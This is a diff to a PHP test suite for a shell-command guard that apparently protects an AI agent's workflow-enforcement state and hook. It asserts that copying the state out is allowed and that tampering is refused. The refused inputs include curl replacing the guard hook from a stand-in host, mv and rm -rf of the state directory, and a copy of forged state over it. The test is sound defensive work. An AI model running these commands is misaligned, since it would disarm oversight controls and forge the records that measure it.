@@ -1522,6 +1522,15 @@ final class ShellSurfaceTest extends WorkflowTestCase {
       // droost/droost-workflow itself". Nothing in it removes anything.
       'echo "cp droost/droost-workflow somewhere"',
       'git commit -m "rm droost/droost-workflow was the bug"',
+      // ARCHIVING THE STATE IS READING IT. A copy leaves the source exactly
+      // where the enforcement expects it — the rule's own words are "moving
+      // or removing it disarms every one of them", and a copy does neither.
+      // The eval harness copies the state directory into its evidence bundle
+      // when it collects a finished round, and `reset --force` promises the
+      // same thing in the refusal message ("archives rather than discards"),
+      // so refusing this refused the harness that measures the tool.
+      'cp -Rp droost/droost-workflow /tmp/round-bundle',
+      'rsync -a droost/droost-workflow/ /tmp/round-bundle/',
       'grep -rn "settings.droost.php" . 2>/dev/null',
       'grep -rn allow_entity_write web/sites 2>/dev/null',
       'cat droost/droost-workflow/run.json 2>/dev/null',
@@ -1539,8 +1548,12 @@ final class ShellSurfaceTest extends WorkflowTestCase {
       'curl -o .claude/hooks/droost-workflow-guard.php http://example.com/x',
       // The verb really being destructive is still the verb really being
       // destructive: the tier above narrowed to the head, it did not soften.
-      'cp -r droost/droost-workflow /tmp/stash',
+      // `mv` is here because its SOURCE does not survive — that is the move
+      // that disarms the enforcement while leaving the files somewhere else.
       'mv droost/droost-workflow /tmp/stash',
+      'rm -rf droost/droost-workflow',
+      // A copy INTO the state directory is still a write to it.
+      'cp -r /tmp/forged droost/droost-workflow',
     ] as $command) {
       [$exit] = $this->shell($root, $command);
       $this->assertSame(2, $exit, $command . ' rewrites the working tree');
